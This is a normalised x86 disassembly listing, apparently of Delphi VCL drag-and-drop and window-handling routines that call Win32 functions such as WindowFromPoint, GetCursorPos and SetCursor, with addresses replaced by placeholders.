sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43bb5c
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404534
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43ac50
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43bbbc
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43bb5c
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43bbe8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43b948
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43bbbc
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43bb04
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4445f8
mov [ esi ] eax
sub_43bc38
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43bb04
cmp eax 0x1
sbb eax eax
inc eax
sub_43bc74
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_443094
test eax eax
je r-xdata
mov eax esi
call sub_443094
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43c6a4
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413de4
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413e40
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_4430a8
mov edi eax
jmp r-xdata
sub_43bd08
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43bbe8
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44611c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43bc38
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43bc38
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43d93c
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43bc38
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4460d8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43bc74
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40349c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_446204
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44611c
jmp r-xdata
mov eax [ rw-data ]
call sub_446278
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43d93c
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40349c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40349c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407da4
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43bfd8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43b204
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44611c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43bd08
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43c148
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43c2ed
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40349c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40349c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b50c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43bfd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b3f4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4445f8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412988
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43d910
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412988
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43c30c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40349c
mov ebx eax
sub_43c380
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43c64c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43c5da
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43b24c
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403450
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43c30c
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43bc38
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_446278
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c5e1
mov eax [ rw-data ]
call sub_4032a0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_455244
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43efc4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43bb04
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_458eb0
sub_43c5e1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40342c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
sub_43c670
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ac84
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43c6a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43c670
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43d93c
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_441ee4
test eax eax
je r-xdata
mov esi eax
sub_43c6ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413c88
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx ] eax
sub_43c714
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413f80
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4032a0
xor eax eax
mov [ ebx ] eax
sub_43c734
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43c764
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4141e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c814
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43c7ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43c9a0
call sub_403ad8
call sub_403ad8
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413de4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41e35c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43c820
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4141e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c8be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c8c5
mov eax [ rw-data ]
call sub_414248
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43c896
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43c9a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e3b8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413de4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e35c
test al al
je r-xdata
sub_43c8cc
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_43c9a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41de00
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_43c8f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e560
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41e564
mov eax [ ebp - 0x4 ]
call sub_43c9ec
mov eax [ rw-data ]
call sub_4141e4
mov ebx eax
xor eax eax
push ebp
push sub_43c97d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413c88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414248
retn
call sub_43c764
sub_43c9a0
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41e564
mov edx ebx
mov eax [ rw-data ]
call sub_4141f8
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43c9ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e454
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43ca18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43ca54
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414518
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43ca9c
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43cb58
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cc25
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc2c
lea eax [ ebp - 0x1c ]
call sub_404074
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40349c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44d7fc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408dbc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4040c8
sub_43cc48
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43ccaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a410
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43ddf8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov edx [ eax + 0x64 ]
pop eax
call sub_404480
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ccb6
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov al 0x1
sub_43ccbc
push ebx
mov ebx eax
mov eax ebx
call sub_44a438
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ccf0
push ebx
mov ebx eax
